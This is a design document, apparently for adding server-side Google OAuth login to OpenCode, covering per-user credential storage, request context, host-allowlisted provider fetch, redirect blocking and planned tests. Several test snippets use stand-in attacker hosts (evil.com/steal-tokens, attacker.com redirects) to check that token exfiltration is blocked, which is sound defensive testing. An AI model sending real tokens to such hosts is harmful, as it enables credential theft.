# Server-Side Google Login Implementation

## Overview

This document describes the server-side authentication implementation for OpenCode, enabling per-user credential persistence and OAuth token management for web deployments while maintaining backward compatibility with local CLI usage.

## Architecture

The implementation follows a **dual-mode authentication model**:

- **CLI Mode** (default): File-based credentials in `~/.local/share/opencode/auth.json`
- **Server Mode** (`OPENCODE_SERVER_MODE=true`): Per-user database-backed credentials

### Key Components

#### 1. AuthStore Abstraction (`src/auth/auth-store.ts`)

Interface that abstracts credential storage:

```typescript
interface AuthStore {
  get(providerId: string, userKey?: string, orgKey?: string): Promise<Auth.Info | null>
  set(providerId: string, auth: Auth.Info, userKey?: string, orgKey?: string): Promise<void>
  remove(providerId: string, userKey?: string, orgKey?: string): Promise<void>
}
```

Two implementations:
- **FileAuthStore**: Local file-based storage (ignores user/org keys)
- **ServerAuthStore**: Database-backed storage (requires user/org keys)

#### 2. Request Context (`src/auth/request-context.ts`)

Uses Node.js AsyncLocalStorage to propagate per-request user context:

```typescript
interface RequestContextData {
  userKey: string           // User identifier
  orgKey: string           // Organization identifier
  tokenCache: Map<...>     // Per-request token memoization
  refreshBudget: Set<...>  // Refresh attempt tracking (max 1 per provider)
}
```

Middleware in `src/server/server.ts` initializes context for each request:

```typescript
RequestContext.run({ userKey, orgKey, tokenCache: new Map(), refreshBudget: new Set() }, () => next())
```

#### 3. Secure Provider Fetch (`src/provider/secure-fetch.ts`)

Wrapper around provider HTTP requests that enforces:

- **HTTPS-only**: No unencrypted traffic
- **Port validation**: Default ports only (443 for HTTPS)
- **Host allowlists**: Per-provider domain restrictions (prevents auth leakage)
- **Auth token injection**: Adds `Authorization: Bearer <token>` for OAuth providers
- **Redirect handling**: Fail-closed on 3xx redirects (prevent auth bypass)
- **Token refresh**: On-demand refresh with per-request deduping (max 1 refresh per provider per request)

#### 4. OAuth Refresh Handler (`src/auth/oauth-handler.ts`)

Handles token refresh with multi-instance deduping via database row locks:

```typescript
OAuthHandler.refreshWithDedupe(providerId, userKey, orgKey)
```

Ensures only one instance refreshes a token simultaneously, preventing race conditions.

## Integration Points

### Auth Module Changes (`src/auth/index.ts`)

Updated `Auth.get()` and `Auth.set()` to be server-mode aware:

```typescript
// CLI mode: uses FileAuthStore, ignores user context
// Server mode: uses ServerAuthStore, requires RequestContext

if (Auth.isServerMode()) {
  if (!RequestContext.current()?.userKey) {
    throw new UnauthenticatedError("missing user context")
  }
  // Use ServerAuthStore with per-user isolation
} else {
  // Use FileAuthStore (local file)
}
```

### Server Middleware (`src/server/server.ts`)

Two new middleware layers:

1. **RequestContext Middleware** (line ~127):
   ```typescript
   .use(async (c, next) => {
     if (Auth.isServerMode()) {
       const userKey = extractUserFromRequest(c) // TODO: implement
       const orgKey = extractOrgFromRequest(c) ?? 'default'
       return RequestContext.run({ userKey, orgKey, ... }, () => next())
     }
     return next()
   })
   ```

2. **Error Mapping Middleware** (line ~155):
   ```typescript
   .use(async (c, next) => {
     try {
       await next()
     } catch (error) {
       if (error instanceof UnauthenticatedError) return c.json({...}, 401)
       if (error instanceof ForbiddenError) return c.json({...}, 403)
       throw error
     }
   })
   ```

### Provider Auth Integration (`src/provider/provider.ts`)

Updated `getSDK()` to wrap provider fetch calls:

```typescript
const secureFetch = createSecureProviderFetch(model.providerID, baseFetch)
options["fetch"] = secureFetch
```

This ensures:
- All provider HTTP calls go through security checks
- Auth tokens are injected for OAuth providers
- Hosts are validated against allowlists
- Redirects are blocked (fail-closed)

## Implementation Status

### Completed Phases

#### Phase 1: AuthStore Abstraction ✅
- Created `AuthStore` interface
- Implemented `FileAuthStore` (local file-based)
- Implemented `ServerAuthStore` (database-backed, placeholder)
- Modified `Auth.get/set/remove` to use abstraction
- Runtime mode detection via `OPENCODE_SERVER_MODE` env var

**Files**: `src/auth/auth-store.ts`, `src/auth/index.ts`

#### Phase 2: Request Context & Middleware ✅
- Created `RequestContext` with AsyncLocalStorage
- Added RequestContext middleware to server
- Added error mapping middleware for auth errors
- Supports per-request token caching and refresh budgeting

**Files**: `src/auth/request-context.ts`, `src/server/server.ts`

#### Phase 3: Secure Provider Fetch ✅
- Created host allowlists per provider
- Implemented HTTPS + port validation
- Added auth token injection for OAuth providers
- Fail-closed redirect handling
- On-demand token refresh with per-request deduping

**Files**: `src/provider/secure-fetch.ts`, `src/provider/provider.ts`

#### Phase 4: OAuth Refresh Handler ✅
- Created `OAuthHandler` namespace for refresh logic
- Designed multi-instance deduping via row-level locks
- Placeholder for database transaction implementation

**Files**: `src/auth/oauth-handler.ts`

### Remaining Work

#### Database Integration
**Priority: HIGH** - Required for server mode to function

1. **Implement ServerAuthStore database methods**:
   - `get()`: Query user tokens from database
   - `set()`: Insert/update user tokens (encrypted)
   - `remove()`: Delete user tokens

2. **Implement OAuthHandler refresh**:
   - Row-level locking (SELECT ... FOR UPDATE)
   - Transaction handling
   - Token refresh logic (call OAuth provider)

3. **Create database schema**:
   ```sql
   CREATE TABLE user_provider_tokens (
     org_key TEXT NOT NULL DEFAULT 'default',
     user_key TEXT NOT NULL,
     provider_id TEXT NOT NULL,
     token_type TEXT NOT NULL,
     access_token TEXT,
     refresh_token TEXT,  -- Encrypted with AES-256-GCM
     api_key TEXT,        -- Encrypted if sensitive
     expires_at INTEGER,
     enterprise_url TEXT,
     updated_at TIMESTAMP,
     PRIMARY KEY (org_key, user_key, provider_id)
   );
   ```

#### User Context Extraction
**Priority: HIGH** - Required for RequestContext middleware

Implement in `src/server/server.ts` RequestContext middleware:
- Extract user from session/JWT
- Extract organization context
- Validate permissions
- Handle missing user gracefully

Example placeholder in code shows where this should go (line ~133).

#### OAuth Flow Implementation
**Priority: MEDIUM** - For web UI login

1. Create OAuth initiation endpoint
2. Create OAuth callback handler
3. Store tokens in database
4. Handle token refresh errors

#### Encryption for Refresh Tokens
**Priority: MEDIUM** - For production security

1. Implement AES-256-GCM encryption for refresh tokens
2. Master key management (env secret or KMS)
3. Key rotation if needed

#### Provider Host Allowlist Configuration
**Priority: MEDIUM** - Currently hardcoded

Make host allowlists configurable:
- Load from `opencode.json` config
- Environment variable override
- Validation on startup

## Testing Strategy

### Unit Tests

```typescript
// Test AuthStore abstraction
describe("Auth namespace", () => {
  it("uses FileAuthStore in CLI mode", async () => {
    delete process.env.OPENCODE_SERVER_MODE
    const auth = await Auth.get("google")
    // Should use file-based storage
  })

  it("uses ServerAuthStore in server mode", async () => {
    process.env.OPENCODE_SERVER_MODE = "true"
    RequestContext.run({ userKey: "user1", orgKey: "org1", ... }, async () => {
      const auth = await Auth.get("google")
      // Should use database storage with user isolation
    })
  })

  it("throws UnauthenticatedError if user context missing in server mode", async () => {
    process.env.OPENCODE_SERVER_MODE = "true"
    expect(() => Auth.get("google")).toThrow(UnauthenticatedError)
  })
})
```

### Integration Tests

```typescript
// Test secure fetch
describe("Secure Provider Fetch", () => {
  it("injects auth tokens for OAuth providers", async () => {
    const fetch = createSecureProviderFetch("antigravity", mockFetch)
    RequestContext.run({ userKey: "user1", orgKey: "org1", ... }, async () => {
      await fetch("https://api.example.com/v1/models")
      expect(mockFetch).toHaveBeenCalledWith(
        expect.anything(),
        expect.objectContaining({
          headers: expect.objectContaining({
            Authorization: expect.stringContaining("Bearer ")
          })
        })
      )
    })
  })

  it("blocks requests to disallowed hosts", async () => {
    const fetch = createSecureProviderFetch("google", mockFetch)
    expect(async () => {
      await fetch("https://evil.com/steal-tokens")
    }).toThrow(/disallowed host/)
  })

  it("fails closed on 3xx redirects", async () => {
    const fetch = createSecureProviderFetch("google", mockFetch)
    mockFetch.mockResolvedValueOnce(new Response("", { status: 301, headers: { location: "https://evil.com" } }))
    expect(async () => {
      await fetch("https://api.google.com/v1/models")
    }).toThrow(/Redirects not allowed/)
  })
})
```

### Acceptance Tests (High Priority)

**Two-user isolation test**: Concurrent requests from users A and B

```typescript
it("isolates credentials between concurrent users", async () => {
  const interceptions: any[] = []
  const mockFetch = (input, init) => {
    interceptions.push({ url: input, auth: init.headers?.Authorization })
    return fetch(input, init)
  }

  await Promise.all([
    RequestContext.run({ userKey: "userA", orgKey: "org1", ... }, async () => {
      await streamMessage("userA prompt")
    }),
    RequestContext.run({ userKey: "userB", orgKey: "org1", ... }, async () => {
      await streamMessage("userB prompt")
    })
  ])

  // Assert no token cross-contamination
  const userARequests = interceptions.filter(r => r.url.includes("userA"))
  const userBRequests = interceptions.filter(r => r.url.includes("userB"))
  // Each user's requests should have correct token
})
```

**Forced redirect test**: Verify redirect blocking

```typescript
it("blocks redirect to disallowed host even with valid token", async () => {
  const secureFetch = createSecureProviderFetch("google", (input, init) => {
    if (input === "https://generativelanguage.googleapis.com/v1/models") {
      return new Response("", {
        status: 302,
        headers: { location: "https://attacker.com" }
      })
    }
    return fetch(input, init)
  })

  expect(async () => {
    await secureFetch("https://generativelanguage.googleapis.com/v1/models", {
      headers: { Authorization: "Bearer ..." }
    })
  }).toThrow(/Redirects not allowed/)
})
```

**Token refresh contention**: 50 concurrent requests when token expired

```typescript
it("dedupes token refresh across concurrent requests", async () => {
  let refreshCount = 0
  // Mock OAuth provider to count refresh calls
  mockOAuthProvider.refresh = () => {
    refreshCount++
    return { access_token: "new_token" }
  }

  // Expire token
  await Auth.set("antigravity", { ..., expires: 0 })

  // 50 concurrent requests
  await Promise.all(
    Array(50).fill().map(() =>
      RequestContext.run({ userKey: "user1", orgKey: "org1", ... }, async () => {
        await sendProviderRequest()
      })
    )
  )

  // Should refresh exactly once (not 50 times)
  expect(refreshCount).toBe(1)
})
```

**ALS performance gate**: Verify AsyncLocalStorage overhead

```typescript
it("achieves <5% throughput regression with ALS", async () => {
  // Benchmark without ALS
  const withoutALS = await benchmarkStreaming(1000, (fn) => fn())

  // Benchmark with ALS
  const withALS = await benchmarkStreaming(1000, (fn) =>
    RequestContext.run({ userKey: "user1", ... }, fn)
  )

  const regression = ((withALS - withoutALS) / withoutALS) * 100
  expect(regression).toBeLessThan(5)
})
```

## Security Considerations

### Token Storage

- **Refresh tokens** must be encrypted at rest (AES-256-GCM)
- **Access tokens** can be stored unencrypted but should be short-lived
- **Master key** should come from environment variable or KMS

### Request Context Isolation

- AsyncLocalStorage ensures no cross-request leakage
- Each request gets isolated token cache and refresh budget
- RequestContext destroyed after response sent

### Host Validation

- Provider hosts are validated on every fetch (includes redirect checks)
- Default-deny policy for unknown providers
- No token injection without explicit provider configuration

### Redirect Handling

- Manual redirect handling prevents automatic header propagation
- Failed-closed policy: redirects throw errors rather than following
- Prevents auth token leakage to untrusted hosts

## Deployment Guide

### Enable Server Mode

Set environment variable:
```bash
export OPENCODE_SERVER_MODE=true
```

### Implement User Context Extraction

Update RequestContext middleware in `src/server/server.ts`:

```typescript
.use(async (c, next) => {
  if (Auth.isServerMode()) {
    // Extract from session cookie
    const session = await getSessionFromRequest(c)
    const user = await getUserFromSession(session)

    if (!user) {
      return c.json({ error: "Unauthorized" }, 401)
    }

    return RequestContext.run({
      userKey: user.id,
      orgKey: user.organizationId ?? "default",
      tokenCache: new Map(),
      refreshBudget: new Set(),
    }, () => next())
  }
  return next()
})
```

### Configure OAuth Flow

1. Register OAuth app with Google (or OAuth provider)
2. Configure redirect URI: `https://your-domain.com/auth/callback`
3. Store client ID and secret in environment
4. Implement OAuth endpoints:
   - `POST /auth/google/start` - Initiate OAuth flow
   - `GET /auth/callback?code=...&state=...` - Handle OAuth callback

### Set Up Database

1. Create `user_provider_tokens` table
2. Add encryption keys to environment
3. Configure connection pooling for production load
4. Test token encryption/decryption

### Monitor and Alert

Key metrics to track:
- Token refresh failures
- Authentication errors by provider
- Provider API latency
- Database query performance

## Known Limitations

1. **ServerAuthStore not yet implemented** - Requires database integration
2. **OAuthHandler refresh placeholder** - Needs real OAuth logic
3. **User context extraction TODO** - Must implement in middleware
4. **Provider host allowlists hardcoded** - Should be configurable
5. **No encryption yet** - Refresh tokens stored plaintext (requires AES-256-GCM)

## Next Steps

1. **Implement database integration** (highest priority)
   - Database schema migration
   - ServerAuthStore methods
   - OAuthHandler refresh with row locks

2. **Implement user context extraction**
   - Session management integration
   - User/org identification from request
   - Permission validation

3. **Implement OAuth flow**
   - Google OAuth endpoints
   - Token storage after login
   - Session establishment

4. **Add encryption**
   - AES-256-GCM for refresh tokens
   - Master key management
   - Rotation if needed

5. **Make host allowlists configurable**
   - Load from config file
   - Environment variable overrides
   - Validation on startup

## References

- [AsyncLocalStorage](https://nodejs.org/api/async_hooks.html#async_hookscreateasynclocalstoragestore)
- [OAuth 2.0 Refresh Token](https://datatracker.ietf.org/doc/html/rfc6749#section-6)
- [AI SDK Fetch Customization](https://sdk.vercel.ai/docs/concepts/faq#can-i-use-the-sdk-with-a-custom-fetch-implementation)
